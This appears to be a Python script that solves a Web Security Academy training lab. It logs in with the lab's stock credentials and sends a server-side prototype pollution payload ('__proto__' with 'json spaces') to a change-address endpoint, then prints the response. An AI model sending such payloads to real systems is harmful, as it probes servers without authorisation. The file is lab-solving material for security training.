from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("wiener", "peter", with_json=True)

    payload = {"sessionId": session.cookies["session"], "__proto__": {"json spaces": 5}}
    logger.info('POSTing the following JSON to "/my-account/change-address":')
    logger.info(payload)
    response = session.post_path("/my-account/change-address", json=payload)

    logger.info("Received the following response:")
    print(response.text)
